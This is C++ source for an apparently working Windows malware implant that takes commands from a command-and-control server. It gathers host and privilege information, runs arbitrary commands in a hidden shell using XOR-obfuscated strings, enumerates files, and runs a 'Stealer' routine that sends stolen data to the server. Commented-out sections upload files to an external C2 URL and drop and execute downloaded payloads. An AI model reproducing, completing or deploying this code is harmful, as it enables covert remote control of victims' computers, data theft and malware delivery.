#include "execute.h"

/* Directory of Commands
- Persistence   
- Situational_Awareness
- Stealer
- Execution <arg> - List command to run
- File_Enumeration <arg> - List files in the directory
- File Upload
- kill
- Dropper
 */
void execute(std::string command, std::string args, int task_id, int implant_id){

    std::string results;
    std::string work = "Yes";

    /* Persistance */
    // only uncomment in sandbox
    if(command.compare("Persistence_1") == 0){
        try{
            std::string username = getUserName();
            // persist_execution(getUserName());
        }
        catch(...){
            HttpResponse("/response_json", implant_id, task_id, "failed", "failure", command);
            work = "No";
        }
        if(work.compare("No") == 1){
            HttpResponse("/response_json", implant_id, task_id, "executed", "success", command);
        }
        
    }

    /* Situational Awareness */
    if(command.compare("Situational_Awareness") == 0){

        try{
            json results_parse = GetAll();
            results.append(results_parse.at("userName"));
            results.append(results_parse.at("compName"));
            results.append(results_parse.at("ipName"));
            results.append(results_parse.at("Privileges"));

            /* Formats string so that the endpoint can accept it */
            results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
            results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
            std::replace( results.begin(), results.end(), '\\', '/');
            std::replace( results.begin(), results.end(), '-', '_');


        }
        catch(...){
            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
            work = "No";
        }
        if(work.compare("No") == 1){
            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
        }

    }

    /* Execution */
    if(command.compare("Execution") == 0){
        try{
            char* c = strcpy(new char[args.length() + 1], args.c_str());
            std::string res = exec(c);
                
            /* Formats string so that the endpoint can accept it */
            results = res;
            results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
            results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
            std::replace( results.begin(), results.end(), '\\', '/');
            std::replace( results.begin(), results.end(), '-', '_');
        }
        catch(...){
            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
            work = "No";
        }
        if(work.compare("No") == 1){
            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
        }
    }
    
    /* File Enumeration */
    if(command.compare("File_Enumeration") == 0){
        try{
            std::string path = args;
            std::string storage =(getFileNamesFromPath(path));

            /* Formats string so that the endpoint can accept it */
            results = storage;
            results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
            results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
            std::replace( results.begin(), results.end(), '\\', '/');
            std::replace( results.begin(), results.end(), '-', '_');
        }
        catch(...){
            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
            work = "No";
        }
        if(work.compare("No") == 1){
            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
        }
    }
   
    /* Stealer Function */
    if(command.compare("Stealer") == 0){
        try{
            json data_from_driver;
            data_from_driver = driver();
            //results = data_from_driver.dump(); 

            printf("WE GOT RESULTS \n");             

            StealerHttpResponse("/response_stealer", implant_id, task_id, data_from_driver, "success", command);

            printf("SENT SUCCESS \n");
        }
         catch(...){
            try{
                printf("IN 2nd try block :((((( \n");
                HttpResponse("/response_stealer", implant_id, task_id, results, "failure", command);
            }
            catch(...){
                printf("down bad\n");
            }
            
        }
        

    }
   
    
    if (command.compare("kill") == 0){
            printf("ABOUT TO EXIT\n");
            exit(0);
            abort();
        }


    /* Send Files To C2
    if(command.compare("SendToC2") == 0){
            std::istringstream ss(args);
			std::string path;
			std::string filename;
			ss >> path;
			ss >> filename;
        try{
            // Add in Command for Post.cpp 
            sendToC2(path,"https://sea-lion-app-f5nrq.ondigitalocean.app/upload_files", filename, std::to_string(task_id), std::to_string(implant_id));
        }
        catch(...){
            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
            work = xor_string("fG",0x28);
        }
        if(work.compare(xor_string("fG",0x28)) == 1){
            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, "success", command);
        }

    }
    */
   /*
    if (command.compare("Dropper") == 0){
        try {
            std::string arg1;
            std::string arg2;
            bool arg3=true;
            int arg=0;
            for(int x=0;x<command.length();x++){
                if(command[x]==(' ')){
                    if(arg == 0){
                        arg1= command.substr(0,x+1);
                        arg=x+1;
                    }
                    else{
                        arg2=command.substr(arg,x-arg);
                        if(command[command.length()-1]=='1'){
                            arg3=false;

                        }
                            
                        break;
                    }
                }
                    
            }
            dropToPath(arg1,arg2,arg3);

            
            //dropToPath(std::string url, std::string filePath, bool execute);

        } catch(...){
            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
            work = xor_string("fG",0x28);
        }
        if(work.compare(xor_string("fG",0x28)) == 1){
            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, "success", command);
        }
    }
        */
    
    return;
}


/* Executing using command line
using Windows API
 https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe
 */
std::string exec(char* args){
  
   LPSTR cmd = (char*)malloc(sizeof(args)/sizeof(char)
    + 50);
    sprintf(cmd, xor_string("vxq;pmp5:v50f",0x15).c_str(), args);
    HANDLE hStdOutRead, hStdOutWrite;

    hStdOutRead = GetStdHandle(STD_OUTPUT_HANDLE); 
    if ((hStdOutRead == INVALID_HANDLE_VALUE) || (hStdOutWrite == INVALID_HANDLE_VALUE))
        return "";

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle = TRUE;
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    
    if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
        return "";
    }
    SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.hStdInput = NULL;
    si.hStdError = hStdOutWrite;
    si.hStdOutput = hStdOutWrite;
    BOOL creationResult = CreateProcessA(
        NULL,
        cmd,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );
    std::string output;
    if (creationResult){
        LPVOID buffer[4096];
        DWORD bytesAvail = 0, bytesRead = 0;
        do {
            do {
            ZeroMemory(buffer, 4096);
            if (!PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesAvail, NULL)) {
                return "";
            }

            if (bytesAvail) {
                if (!ReadFile(hStdOutRead, buffer, 4095, &bytesRead, NULL)) {
                    return "";
                }
                if (bytesRead) {
                     char *charData = (char*)buffer;
                    output = std::string(charData);
  
                }
            }
        } while (bytesAvail != 0);
    } while (WaitForSingleObject(pi.hProcess, 0) == WAIT_TIMEOUT);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hStdOutRead);
        CloseHandle(hStdOutWrite);
    }
    
    return output;
}
